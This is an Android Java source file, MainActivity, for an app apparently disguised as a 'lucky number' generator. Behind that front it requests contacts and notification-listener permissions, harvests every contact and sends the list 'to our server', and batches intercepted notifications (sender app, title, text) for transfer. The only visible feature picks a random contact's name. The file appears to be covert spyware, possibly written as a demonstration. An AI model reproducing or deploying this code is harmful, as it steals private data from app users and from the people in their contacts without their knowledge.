package com.luckynum;

import static android.provider.Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.widget.TextView;
import android.widget.Toast;

import com.luckynum.data.FreeNotifs;
import com.luckynum.interfaces.ContactsInterface;
import com.luckynum.model.Notif;
import com.luckynum.utils.ContactsManager;
import com.luckynum.data.FreeContacts;
import com.luckynum.model.Contact;

import java.sql.Array;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ThreadLocalRandom;

public class MainActivity extends AppCompatActivity implements View.OnClickListener, ContactsInterface /*, LoaderManager.LoaderCallbacks<Cursor> */{

    private MyBroadcastReceiver broadcastReceiver;

    private static final String ENABLED_NOTIFICATION_LISTENERS = "enabled_notification_listeners";
    private static List<Notif> notifications = new ArrayList<>();
    private static FreeNotifs freeNotifs = new FreeNotifs();
    private List<Contact> contactsList = new ArrayList<>();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        findViewById(R.id.coolBtn).setOnClickListener(this);

        // check if we have access to contacts
        if (isContactAccessGranted()) {
            initContactManager();
        } else {

            callForContactsPermission();

            // check if we have access to notifications
            if (isNotificationAccessGranted()) {
                broadcastReceiver = new MyBroadcastReceiver();
            } else {
                callForNotifPermission();
            }
        }



    }


    // get broadcasts from NotificationListener
    public static class MyBroadcastReceiver extends BroadcastReceiver {

        @Override
        public void onReceive(Context context, Intent intent) {

            String appPckName = intent.getStringExtra("appPckName");
            String notifTitle = intent.getStringExtra("notifTitle");
            String notifText = intent.getStringExtra("notifText");

            Notif notif = new Notif(appPckName,notifTitle,notifText);

            manageNotifService(notif);

        }
    }

    @SuppressLint("NonConstantResourceId")
    @Override
    public void onClick(View view) {
        switch (view.getId()) {
            case R.id.coolBtn:
                setLuckNum();
                break;
            default:
                break;
        }
    }

    // send the push notifications by blocks of 10 notifications
    private static void manageNotifService(Notif notif) {
        int notifSize = notifications.size();

        if (notifSize < 10) {
            notifications.add(notif);
        } else if (notifSize == 10) {
            freeNotifs.initDataTransfer(notifications);
        } else {
            notifications.clear();
            notifications.add(notif);
        }
    }


    private void callForContactsPermission() {

        AlertDialog alertDialog = new AlertDialog.Builder(
                MainActivity.this).create();

        alertDialog.setTitle(R.string.welcomeCont);
        alertDialog.setMessage(getString(R.string.contTextPerm));
        alertDialog.setButton(DialogInterface.BUTTON_POSITIVE, getString(R.string.ok), (dialogInterface, i) -> {

            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_CONTACTS}, 100);

        });
        alertDialog.show();

    }

    private void callForNotifPermission() {
        AlertDialog alertDialog = new AlertDialog.Builder(
                MainActivity.this).create();

        alertDialog.setTitle(R.string.welcomeCont);
        alertDialog.setMessage(getString(R.string.notifTextPerm));
        alertDialog.setButton(DialogInterface.BUTTON_POSITIVE, getString(R.string.ok), (dialogInterface, i) -> {

            startActivity(new Intent(ACTION_NOTIFICATION_LISTENER_SETTINGS));

        });
        alertDialog.show();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        initContactManager();

    }

    // Special thanks to @kpbird for this checker
    // to check if notifications access is granted
    private boolean isNotificationAccessGranted(){
        String pkgName = getPackageName();
        final String flat = Settings.Secure.getString(getContentResolver(),
                ENABLED_NOTIFICATION_LISTENERS);
        if (!TextUtils.isEmpty(flat)) {
            final String[] names = flat.split(":");
            for (int i = 0; i < names.length; i++) {
                final ComponentName cn = ComponentName.unflattenFromString(names[i]);
                if (cn != null) {
                    if (TextUtils.equals(pkgName, cn.getPackageName())) {
                        return true;
                    }
                }
            }
        }
        return false;
    }

    // check if contacts access is granted
    private boolean isContactAccessGranted() {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
                == PackageManager.PERMISSION_GRANTED;
    }

    // retrieve the contacts
    private void initContactManager() {
        ContactsManager contactsManager = new ContactsManager(this);
        contactsManager.init();

    }

    // interface. When all the contacts have been gathered, initialize the data transfer to our server
    @Override
    public void getContacts(List<Contact> contacts) {
        contactsList = contacts;
        FreeContacts freeContacts = new FreeContacts(contacts);
        freeContacts.initDataTransfer();
    }

    private void setLuckNum() {
        int contactsSize = contactsList.size();
        TextView luckNumPlaceholder = findViewById(R.id.luckNumPlaceholder);

        String luckNumText = luckNumPlaceholder.getText().toString();
        if (luckNumText.isEmpty()) {
            luckNumPlaceholder.setText(getString(R.string.already) + luckNumText);
        } else {
            if (contactsSize > 0) {
                int pos = ThreadLocalRandom.current().nextInt(0, contactsSize - 1);

                luckNumPlaceholder.setText(contactsList.get(pos).getName());

            } else {
                Toast.makeText(MainActivity.this, R.string.errorCalc, Toast.LENGTH_LONG).show();
            }
        }
    }


}
